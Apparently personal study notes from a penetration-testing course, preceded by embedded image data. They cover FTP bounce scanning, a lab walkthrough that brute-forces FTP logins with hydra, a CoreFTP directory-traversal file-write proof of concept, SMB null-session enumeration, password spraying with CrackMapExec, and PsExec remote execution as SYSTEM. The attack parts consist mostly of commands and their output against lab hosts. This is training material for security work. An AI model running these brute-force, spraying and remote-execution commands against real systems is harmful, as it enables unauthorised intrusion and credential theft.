EAEREAERKH0CEjVKf400QhEQAREQAREQAREQAREQAREQAREQgTwEJGrkgaJdIiACIiACIiACIiACIiACIiACIiACpU9Aokbpr5FGKAIiIAIiIAIiIAIiIAIiIAIiIAIikIeARI08ULRLBERABERABERABERABERABERABESg9AnUlP4QNUIREAEREAERKG0Cb968Cby0icBBEMjea/H+y+4/iLHoGiIgAiIgAiJQbAISNYq9Arq+CIiACIhAWRNQQFnWy1eWg8+KFxLVynIZNWgREAEREIE9IiBRY49A6jQiIAIiIAKHg0A2oKyqqgpHjhzZNPnsMYeDjGZZLALcf/nuw2KNR9cVAREQAREQgYMkIFHjIGnrWiIgAiIgAhVLICtkZN9X7MQ1saIT0L1W9CXQAERABERABIpIQKJGEeHr0iIgAiIgAuVLgEByZWUlzM7Ohunp6dDQ0BBev37tE8o6N8p3lhp5ORBYXFz0e5Cf3IMSOcph1TRGERABERCBvSIgUWOvSOo8IiACIiACh4oAwePo6Gi4du1aWFpaCp2dnZtEDQkbh+p2ONDJZkULxLWnT5+G+/fvh+XlZYkaB7oaupgIiIAIiECxCUjUKPYK6PoiIAIiIAJlSeDVq1dhZGTEBY0bN26E+vr6TcGkRI2yXNayGHRW1OBeXFhYCBMTE/4zOobKYjIapAiIgAiIgAh8IAGJGh8IUF8XAREQARE4nAQILJ8/f+62f4o08tImAsUgwL2IkIG4kRU8ijEeXVMEREAEREAEDpKARI2DpK1riYAIiIAIVBwBAkle2kRABERABERABERABA6egB4rHTxzXVEEREAEREAEREAEREAEREAEREAERGAPCEjU2AOIOoUIiIAIiIAIiIAIiIAIiIAIiIAIiMDBE5CocfDMdUUREAEREAEREAEREAEREAEREAEREIE9IKCaGnsAUacQAREQARE4vATochJfh5fC7mceu8NQ4DIWt6TYKvvT3TvURWZ7tvCLr+2P1hEiIAIiIAIiUFkEJGpU1npqNiIgAiIgAgdIoKGhIfCqq6sLR48ePcArl/elYreO5eVlb4m7vr7uYkZtbW1oamoKNTU1Eop2scSIQKurq2FxcdFbuqoDyi7g6VAREAEREIGyJyBRo+yXUBMQAREQAREoBgEC7/Pnz4dPPvkknDt3LnR0dGxyGBRj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IiACIiACIlBJBCRqVNJqai4iIAIiIAIisEMCcmhsDSqfeyP7jXy1NrLH6L0IiIAIiIAIiMD+EpCosb98dXYREAEREAER2HcCpJPQTpTin1t135CQsTdLEWuR0FUmvlSbZG/Y6iwiIAIiIAIisFsCVbv9go4XAREQAREQAREoHQIIFQTWnZ2dob293WtmaNt/AohIbW1t3iq3ubnZ10Ci0f5z1xVEQAREQAREIEtATo0sEb0XAREQAREQgTIigEOAbianTp0Kp0+fDmNjY2F+fl4tRvdhDWNKCuJFR0dHOHHiRDhz5kzo7u72NZCosQ/QdUoREAEREAER2IaARI1tAOljERABERABESglAtnAmfeknZw7dy5MTU15i1GcA7RwJQjfSW2IUppfqY8F3k1NTeHkyZPhiy++CFeuXHGHTEz9ya5Pqc9H4xMBERABERCBcicgUaPcV1DjFwEREAEROPQEcGscP358Q9DAQTA+Pu7vte0tAVgjYuCM+eijj9ypgchRXV0tp8beotbZREAEREAERGBHBI7YE5w3OzpSB4mACIiACIiACJQkAf5fOQIGaSczMzNheno6zM3NhdevX5fkeMt5UDgxGhoaXNignkZra6vXMVGh0HJeVY1dBERABESgnAlI1Cjn1dPYRUAEREAERMAIxDQTRIz0CzhKh9i7WyRdUwMRg1d0aIjz3nHWmURABERABERgNwQkauyGlo4VAREQAREQgRIkINNl8RdFokbx10AjEAEREAEROJwE1NL1cK67Zi0CIiACIiACIiACIiACIiACIiACZU9AokbZL6EmIAIiIAIiIAIiIAIiIAIiIAIiIAKHk4C6nxzOddesRUAEREAEKohAOvVBqSgHt7BKOTk41rqSCIiACIiACBQiIKdGITLaLwIiIAIiIAIiIAIiIAIiIAIiIAIiUNIE5NQo6eXR4ERABERABERgdwTkHtgdLx0tAiIgAiIgAiJQ3gTk1Cjv9dPoRUAEREAEREAEREAEREAEREAERODQEvj/ARgq/0S8gdkTAAAAAElFTkSuQmCC)

```shell-session
$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

#### Lab:

Reset several times to make the FTP port show up.  Then anon login to get password and user list.  Use said lists with hydra to bruteforce login.

```
┌─[✗]─[parrot@parrot]─[~]
└──╼ $hydra -L users.list -P passwords.list ftp://10.129.239.17 -s 2121
Hydra v9.5-dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-01 12:13:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2750 login tries (l:11/p:250), ~172 tries per task
[DATA] attacking ftp://10.129.239.17:2121/
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 2494 to do in 00:10h, 16 active
[2121][ftp] host: 10.129.239.17   login: robin   password: 7iz4rnckjsduza7

```

SSH in with creds to get flag.

# Latest FTP Vulnerabilities

Example vulnerability [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). This is a vulnerability that allows us to write files outside the directory to which the service has access.

## The Concept of the Attack

The CoreFTP service allows an HTTP `PUT` request, which can be used to write content to files.

```shell-session
$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Directory Traversal</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>2.</code></td>
<td>The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>3.</code></td>
<td>The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>4.</code></td>
<td>The destination is another process that has the task of writing the specified contents of the user on the local system.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>


<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Arbitary File Write</strong></th>
<th><strong>Concept of Attacks - Category</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>5.</code></td>
<td>The same information that the user entered is used as the source. In this case, the filename (<code>whoops</code>) and the contents (<code>--data-binary "PoC."</code>).</td>
<td><code>Source</code></td>
</tr>
<tr>
<td><code>6.</code></td>
<td>The process takes the specified information and proceeds to write the desired content to the specified file.</td>
<td><code>Process</code></td>
</tr>
<tr>
<td><code>7.</code></td>
<td>Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.</td>
<td><code>Privileges</code></td>
</tr>
<tr>
<td><code>8.</code></td>
<td>The filename specified by the user (<code>whoops</code>) with the desired content (<code>"PoC."</code>) now serves as the destination on the local system.</td>
<td><code>Destination</code></td>
</tr>
</tbody>
</table>

# Attacking [[SMB\|SMB]]

SMB is the microsoft protocol. Runs on TCP 139 and UDP 137, 138.  In Windows 2000 Microsoft added the option to run SMB directly over TCP/IP on port 445.

Samba is the Unix/Linux open source implementation of the SMB prsmbotocol.

[MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC) is related to SMB. RPC provides a generic way to execute a proceduer (i.e., a function) in a local or remote process.

## Emumeration

Nmap will give us different information but we will often need to scan several times to determine the service version and vulnerability.
```shell-session
$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

The Nmap scan reveals essential information about the target:

-   SMB version (Samba smbd 4.6.2)
-   Hostname HTB
-   Operating System is Linux based on SMB implementation

## Misconfigurations

### Anonymous Authentication

If the SMB server does not require credentials we can access the shares with:

```shell-session
$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

or Use smbmap

```
$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Search recursively:
```shell-session
$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

SInce permissions are Read,Write:

```shell-session
$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

And Upload:
```shell-session
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

### Remote Procedure Call

We can use rpcclient with a null session to enumerate the workstation or Domain Controller.

We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

-   Workgroup/Domain name
-   Users information
-   Operating system information
-   Groups information
-   Shares Folders
-   Password policy information

The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).

```shell-session
$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```


## Protocol Specifics Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) includes the ability to execute password spraying.

```shell-session
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

### SMB

Linux and Windows SMB servers provide different attack paths. When attacking windows SMB, our actions will be limited by the privileges we had on the user we compromise.  We need to be an Administrator to do operations such as:
-   Remote Command Execution
-   Extract Hashes from SAM Database
-   Enumerating Logged-on Users
-   Pass-the-Hash (PTH)

### RCE

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

-   [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
-   [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
-   [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
-   [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
-   [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

```shell-session
$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

### CrackMapExec

CME can be used to run commands and run commands on multiple hosts at one time.

```shell-session
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users

We can search across the network with our credentials to find all the logged on users.

```shell-session
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
